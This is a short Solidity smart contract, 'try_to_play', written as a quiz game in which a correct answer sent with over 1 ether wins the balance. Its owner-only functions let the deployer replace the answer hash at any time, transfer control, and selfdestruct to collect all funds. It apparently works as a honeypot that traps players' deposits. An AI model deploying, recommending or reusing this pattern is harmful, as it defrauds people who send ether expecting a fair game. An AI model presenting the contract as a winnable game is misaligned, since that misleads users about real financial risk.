1 pragma solidity ^0.4.20;
2 
3 contract try_to_play
4 {
5     function Try(string _response) external payable {
6         require(msg.sender == tx.origin);
7         
8         if(responseHash == keccak256(_response) && msg.value>1 ether)
9         {
10             msg.sender.transfer(this.balance);
11         }
12     }
13     
14     string public question;
15     
16     address questionSender;
17     
18     bytes32 responseHash;
19  
20     function start_try_to_play(string _question,string _response) public payable {
21         if(responseHash==0x0) 
22         {
23             responseHash = keccak256(_response);
24             question = _question;
25             questionSender = msg.sender;
26         }
27     }
28     
29     function StopGame() public payable onlyQuestionSender {
30        selfdestruct(msg.sender);
31     }
32     
33     function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {
34         question = _question;
35         responseHash = _responseHash;
36     }
37     
38     function newQuestioner(address newAddress) public onlyQuestionSender {
39         questionSender = newAddress;
40     }
41     
42     modifier onlyQuestionSender(){
43         require(msg.sender==questionSender);
44         _;
45     }
46     
47     function() public payable{}
48 }